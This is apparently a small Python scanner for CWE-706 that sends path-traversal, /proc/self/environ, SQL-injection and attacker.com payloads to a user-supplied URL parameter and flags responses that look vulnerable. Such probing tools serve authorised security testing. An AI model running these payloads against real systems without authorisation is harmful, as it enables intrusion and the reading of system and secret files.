import requests

# List of test payloads to manipulate name resolution
test_payloads = [
    "../etc/passwd",  # Attempt path traversal
    "/proc/self/environ",  # Try accessing sensitive system files
    "nonexistentfile.txt",  # Check if the application reveals file resolution errors
    "invalid_user_id' OR '1'='1",  # SQL injection-like test for broken references
    "http://attacker.com/malicious"  # Check if the app resolves untrusted external resources
]

def check_incorrect_name_resolution(target_url, param):
    print(f"[*] Checking for CWE-706 at: {target_url}")

    for payload in test_payloads:
        test_url = f"{target_url}?{param}={payload}"
        try:
            response = requests.get(test_url, timeout=5)

            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"[!] Possible Vulnerability: Incorrectly resolved reference -> {test_url}")
            elif "not found" in response.text.lower() or "does not exist" in response.text.lower():
                print(f"[-] Proper error handling detected for: {payload}")
        
        except requests.exceptions.RequestException as e:
            print(f"[-] Error accessing {test_url}: {e}")

# Get user input
target_url = input("Enter the target URL (e.g., https://example.com/resource): ")
param_name = input("Enter the vulnerable parameter name (e.g., file, id, user): ")
check_incorrect_name_resolution(target_url, param_name)
